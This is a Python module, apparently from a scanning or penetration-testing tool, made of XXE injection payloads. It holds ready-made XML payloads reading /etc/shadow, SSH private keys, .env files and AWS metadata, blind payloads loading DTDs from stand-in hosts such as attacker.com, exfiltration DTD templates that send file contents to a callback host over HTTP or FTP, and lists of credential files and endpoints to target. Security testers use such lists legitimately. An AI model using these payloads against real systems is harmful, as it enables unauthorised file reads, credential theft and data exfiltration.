"""
XML External Entity (XXE) Injection Payloads

Payloads for testing XXE vulnerabilities including:
- Classic XXE (file read)
- Blind XXE (out-of-band)
- Error-based XXE
- Parameter entity injection
- XXE via SVG
- XXE via DOCX/XLSX
"""

# Classic XXE payloads - File read
XXE_FILE_READ_PAYLOADS = [
    # Basic /etc/passwd read
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        "check": "root:",
        "description": "Basic file read (/etc/passwd)",
        "target_file": "/etc/passwd",
        "severity": "critical",
    },

    # Windows hosts file
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>""",
        "check": "localhost",
        "description": "Windows hosts file read",
        "target_file": "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "severity": "critical",
    },

    # /etc/shadow (privilege check)
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>""",
        "check": "root:",
        "description": "Shadow file read (requires privilege)",
        "target_file": "/etc/shadow",
        "severity": "critical",
    },

    # PHP filter for source code
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>""",
        "check": "PD9",
        "description": "PHP source via filter",
        "target_file": "index.php",
        "severity": "critical",
    },

    # AWS metadata
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>""",
        "check": "ami-id",
        "description": "AWS metadata SSRF",
        "target_file": "AWS metadata",
        "severity": "critical",
    },

    # .env file
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/.env">
]>
<root>&xxe;</root>""",
        "check": "DB_",
        "description": "Laravel .env file read",
        "target_file": ".env",
        "severity": "critical",
    },

    # SSH private key
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<root>&xxe;</root>""",
        "check": "PRIVATE KEY",
        "description": "SSH private key read",
        "target_file": "/root/.ssh/id_rsa",
        "severity": "critical",
    },
]

# Parameter entity XXE
XXE_PARAMETER_ENTITY_PAYLOADS = [
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",
        "check": "root:",
        "description": "Parameter entity file read",
        "severity": "critical",
    },

    # External DTD parameter entity
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>""",
        "check": "attacker",
        "description": "External DTD injection",
        "severity": "critical",
    },
]

# Blind XXE payloads (Out-of-Band)
XXE_BLIND_PAYLOADS = [
    # DNS-based blind XXE
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.ATTACKER_DOMAIN/test">
]>
<root>&xxe;</root>""",
        "description": "Blind XXE via HTTP",
        "oob_type": "http",
        "severity": "high",
    },

    # FTP-based exfiltration
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>""",
        "description": "Blind XXE FTP exfil",
        "oob_type": "ftp",
        "severity": "critical",
    },

    # Netdoc (Java specific)
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<root>&xxe;</root>""",
        "check": "root:",
        "description": "Java netdoc protocol",
        "severity": "critical",
    },
]

# Error-based XXE
XXE_ERROR_BASED_PAYLOADS = [
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>""",
        "check": "root:",
        "description": "Error-based file read",
        "severity": "critical",
    },
]

# XInclude attacks (when you can't control the DOCTYPE)
XINCLUDE_PAYLOADS = [
    {
        "payload": """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>""",
        "check": "root:",
        "description": "XInclude file read",
        "severity": "critical",
    },

    {
        "payload": """<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://attacker.com/xxe" parse="xml"/>
</root>""",
        "description": "XInclude SSRF",
        "severity": "high",
    },
]

# SVG-based XXE
XXE_SVG_PAYLOADS = [
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>""",
        "check": "root:",
        "description": "SVG XXE file read",
        "content_type": "image/svg+xml",
        "severity": "critical",
    },

    # SVG via image tag
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%"/>
  <text y="20">&xxe;</text>
</svg>""",
        "check": "",
        "description": "SVG hostname disclosure",
        "content_type": "image/svg+xml",
        "severity": "high",
    },
]

# SOAP-based XXE
XXE_SOAP_PAYLOADS = [
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>""",
        "check": "root:",
        "description": "SOAP XXE",
        "content_type": "text/xml",
        "severity": "critical",
    },
]

# XXE in different contexts/wrappers
XXE_CONTEXT_PAYLOADS = [
    # RSS feed
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>""",
        "check": "root:",
        "description": "RSS XXE",
        "severity": "critical",
    },

    # Atom feed
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>&xxe;</title>
</feed>""",
        "check": "root:",
        "description": "Atom feed XXE",
        "severity": "critical",
    },

    # SAML Response
    {
        "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <samlp:Status>&xxe;</samlp:Status>
</samlp:Response>""",
        "check": "root:",
        "description": "SAML XXE",
        "severity": "critical",
    },
]

# UTF-7/16 encoded XXE (bypass WAF)
XXE_ENCODED_PAYLOADS = [
    # UTF-16 encoded
    {
        "payload": """<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        "check": "root:",
        "description": "UTF-16 encoded XXE",
        "encoding": "utf-16",
        "severity": "critical",
    },
]

# Protocol handlers to test
XXE_PROTOCOLS = [
    "file://",
    "http://",
    "https://",
    "ftp://",
    "php://filter/convert.base64-encode/resource=",
    "php://input",
    "expect://",
    "netdoc://",
    "jar:",
    "gopher://",
    "dict://",
    "data://text/plain;base64,",
]

# Common XML endpoints to test
XML_ENDPOINTS = [
    "/api/xml",
    "/api/import",
    "/api/export",
    "/api/upload",
    "/api/parse",
    "/api/process",
    "/import",
    "/export",
    "/upload",
    "/xmlrpc.php",
    "/soap",
    "/wsdl",
    "/feed",
    "/rss",
    "/atom",
    "/sitemap.xml",
    "/api/v1/xml",
    "/api/v1/import",
    "/api/v1/parse",
    "/graphql",  # Some GraphQL implementations accept XML
]

# Content types that may process XML
XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/xhtml+xml",
    "image/svg+xml",
    "text/xml; charset=UTF-8",
    "application/xml; charset=UTF-8",
    "application/soap+xml",
    "application/rss+xml",
    "application/atom+xml",
    "application/xslt+xml",
    "application/mathml+xml",
]

# Files to attempt reading
XXE_TARGET_FILES = [
    # Linux
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/group",
    "/etc/motd",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/www/html/.env",
    "/var/www/html/wp-config.php",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",

    # Windows
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\xampp\\apache\\conf\\httpd.conf",

    # Application configs
    "/app/.env",
    "/app/config/database.yml",
    "/app/config/secrets.yml",
    "/opt/app/.env",
    "/home/user/.env",
]

# DTD for OOB exfiltration
EXTERNAL_DTD_TEMPLATE = """<!ENTITY % file SYSTEM "file:///{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback_host}/?data=%file;'>">
%eval;
%exfil;"""

# FTP exfiltration DTD
FTP_EXFIL_DTD_TEMPLATE = """<!ENTITY % file SYSTEM "file:///{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{callback_host}/%file;'>">
%eval;
%exfil;"""
